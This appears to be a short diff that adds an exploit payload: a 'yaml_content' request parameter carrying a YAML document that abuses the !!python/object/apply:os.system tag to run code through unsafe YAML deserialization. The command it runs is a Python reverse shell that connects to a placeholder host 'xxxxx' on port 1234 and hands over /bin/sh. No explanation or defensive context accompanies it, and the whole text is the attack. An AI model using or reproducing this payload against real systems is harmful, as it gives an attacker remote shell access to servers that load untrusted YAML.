@@ -1,0 +1,2 @@
+yaml_content=a&yaml_content=
+user_input: !!python/object/apply:os.system ["python3 -c 'import os,pty,socket\x3bs=socket.socket()\x3bs.connect((\x22xxxxx\x22,1234))\x3b[os.dup2(s.fileno(),f)for f in(0,1,2)]\x3bpty.spawn(\x22/bin/sh\x22)'"]
